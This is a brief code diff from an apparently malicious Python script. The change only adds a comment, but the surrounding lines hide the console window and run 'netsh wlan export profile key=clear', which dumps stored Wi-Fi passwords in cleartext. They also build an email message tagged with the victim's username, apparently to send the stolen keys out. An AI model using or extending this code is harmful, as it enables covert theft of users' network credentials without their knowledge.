@@ -34,7 +34,7 @@ body = f"file from {pc_username} "
 
 # attach the body with the msg instance
 msg.attach(MIMEText(body, 'plain'))
-si = subprocess.STARTUPINFO()
+si = subprocess.STARTUPINFO()  # this is used for hiding the console
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = subprocess.SW_HIDE  # default
 subprocess.call('netsh wlan export profile key=clear', startupinfo=si)
